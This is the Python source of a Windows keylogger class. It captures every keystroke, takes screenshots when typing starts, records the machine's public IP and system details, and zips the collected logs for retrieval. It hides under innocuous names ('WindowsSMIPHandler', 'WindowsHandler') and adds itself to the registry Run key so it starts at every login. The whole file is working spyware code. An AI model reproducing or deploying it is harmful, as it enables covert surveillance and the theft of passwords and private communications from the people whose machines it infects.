import pynput
import time
import os
import pyautogui
import datetime
import requests
import platform
import shutil
import winreg
import rndm
import typing
import threading

class Logger:

    recent_key_presses = []
    ip_website = "https://jsonip.com/"
    startup_reg = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    listener = None
    first_input = True
    loop = None

    def __init__(self, base_dir: str, key_logs_name: str, system_info_name: str, screenshots_dir_name: str):
        self.base_dir = os.path.join(base_dir, "WindowsSMIPHandler")
        try:
            os.mkdir(self.base_dir)
        except:
            pass
        self.key_logs_path = os.path.join(self.base_dir, key_logs_name)
        self.system_file_path = os.path.join(self.base_dir, system_info_name)
        self.screenshots_dir = os.path.join(self.base_dir, screenshots_dir_name)
        self.zipped_screenshots = f"{self.screenshots_dir}.zip"
        self.random = rndm.Random()
        self.time_check = time.perf_counter()

    @staticmethod
    def get_system_info() -> list:
        system_info = []
        for info in platform.uname():
            system_info.append(info)
        for info in platform.architecture():
            system_info.append(info)
        return system_info

    @staticmethod
    def key_to_string(key: pynput.keyboard.Key) -> str:
        """ convert special key to char/string """
        try:
            key_char = key.char
            if not key_char:
                raise TypeError("Unknown key combination.")
            return key_char
        except AttributeError:
            # special key, char not available
            # without Key.
            new_key = str(key)[4:]
            if "space" in new_key:
                return " "
            elif "enter" in new_key:
                return "\n"
            else:
                return f"[{new_key}]"

    def get_log_files(self) -> list:
        """ returns paths to log files """
        return [self.key_logs_path, self.zipped_screenshots]

    def get_persistence(self) -> None:
        """ start file on startup """
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, self.startup_reg)
            winreg.SetValueEx(key, "WindowsHandler", 0, winreg.REG_SZ, f"{os.getcwd()}\\main.exe")
            winreg.CloseKey(key)
        except:
            return

    def get_public_ip(self) -> str:
        response = requests.get(self.ip_website)
        json = response.json()
        return json["ip"]

    def create_system_file(self) -> str:
        """ log system information """
        with open(self.system_file_path, "w+") as f:
            f.write(f"{self.get_public_ip()}\n")
            f.writelines(self.get_system_info())
        return self.system_file_path

    def check_passed_time(self, desired_time: float) -> bool:
        """ check if desired amount of time has passed """
        now = time.perf_counter()
        try:
            time_passed = now - self.time_check
        except AttributeError:
            return False
        if time_passed >= desired_time:
            return True
        return False

    def on_press(self, key: pynput.keyboard.Key) -> None:
        """ event which gets triggered on every press """
        if self.first_input:
            self.first_input = False
            random_name = self.random.random_string()
            self.screenshot(random_name)
            time_now = datetime.datetime.now()
            self.recent_key_presses.append(f"--- {time_now} ---\n")
        # collect all keys until input is paused for some time
        try:
            final_key = self.key_to_string(key)
        except TypeError:
            return
        self.recent_key_presses.append(final_key)

    def local_logging(self, logs: str) -> None:
        if not os.path.exists(self.key_logs_path):
            open(self.key_logs_path, "w+")
        with open(self.key_logs_path, "a") as f:
            f.write(logs + "\n")

    def start(self):
        self.listener = pynput.keyboard.Listener(on_press=self.on_press)
        self.listener.start()

    def reset_timer(self):
        self.time_check = time.perf_counter()

    def screenshot(self, file_name: str) -> None:
        try:
            os.mkdir(self.screenshots_dir)
        except:
            pass
        file_path = f"{self.screenshots_dir}\\{file_name}.png"
        pyautogui.screenshot().save(file_path)

    def zip_screenshots(self) -> None:
        try:
            shutil.make_archive(self.screenshots_dir, "zip", self.screenshots_dir)
        except:
            return

    def cleanup(self) -> None:
        try:
            shutil.rmtree(self.screenshots_dir)
            os.remove(self.key_logs_path)
            # os.remove(self.system_file_path)
            os.remove(self.zipped_screenshots)
        except Exception as e:
            print(e)

    def logging_loop(self, passed_time: float, sleep: float) -> typing.NoReturn:
        """ determines when to take screenshot and write logs to file """
        self.loop = True
        while self.loop:
            # save keys after stopped typing for some time
            if self.check_passed_time(passed_time):
                self.first_input = True
                keys = "".join(self.recent_key_presses)
                self.recent_key_presses = []
                self.local_logging(keys)
                self.reset_timer()
            time.sleep(sleep)

    def stop(self):
        """ stop thread properly """
        self.loop = False

    def timed_logging(self, passed_time: float, sleep: float) -> None:
        """ create thread and execute the loop """
        logging_thread = threading.Thread(target=self.logging_loop, args=(passed_time, sleep))
        logging_thread.start()
